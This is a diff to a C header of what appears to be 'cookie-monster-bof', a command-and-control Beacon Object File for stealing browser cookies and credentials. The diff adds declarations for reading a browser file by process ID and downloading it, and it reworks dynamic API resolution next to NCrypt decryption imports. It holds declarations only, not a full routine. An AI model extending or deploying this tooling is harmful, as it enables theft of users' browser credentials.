@@ -6,6 +6,10 @@
 #include "cookie-monster-bof.h"
 #include "adaptix.h"
 
+// Function declarations
+BOOL download_file(IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength);
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath);
+
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
@@ -67,22 +71,13 @@ DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt (NCRYPT_KEY_HANDLE h
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
 
-// 定义函数类型
-typedef HRESULT (WINAPI *pSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
-typedef BOOL (WINAPI *pPathAppendA)(LPSTR, LPCSTR);
-typedef void (*psrand)(unsigned int);
-typedef long (*ptime)(long*);
-typedef size_t (*pstrnlen)(const char*, size_t);
-typedef int (*prand)(void);
-typedef void* (*prealloc)(void*, size_t);
-
-#define IMPORT_RESOLVE pSHGetFolderPathA SHGetFolderPath = (pSHGetFolderPathA)Resolver("shell32", "SHGetFolderPathA"); \
-    pPathAppendA PathAppend = (pPathAppendA)Resolver("shlwapi", "PathAppendA"); \
-    psrand srand = (psrand)Resolver("msvcrt", "srand");\
-    ptime time = (ptime)Resolver("msvcrt", "time");\
-    pstrnlen strnlen = (pstrnlen)Resolver("msvcrt", "strnlen");\
-    prand rand = (prand)Resolver("msvcrt", "rand");\
-    prealloc realloc = (prealloc)Resolver("msvcrt", "realloc");
+#define IMPORT_RESOLVE PFN_SHGetFolderPathA SHGetFolderPath = (PFN_SHGetFolderPathA)Resolver("shell32", "SHGetFolderPathA"); \
+    PFN_PathAppendA PathAppend = (PFN_PathAppendA)Resolver("shlwapi", "PathAppendA"); \
+    FARPROC srand = Resolver("msvcrt", "srand");\
+    FARPROC time = Resolver("msvcrt", "time");\
+    FARPROC strnlen = Resolver("msvcrt", "strnlen");\
+    FARPROC rand = Resolver("msvcrt", "rand");\
+    FARPROC realloc = Resolver("msvcrt", "realloc");
 #define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
 #define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
 #define DATA_FREE(d, l) \
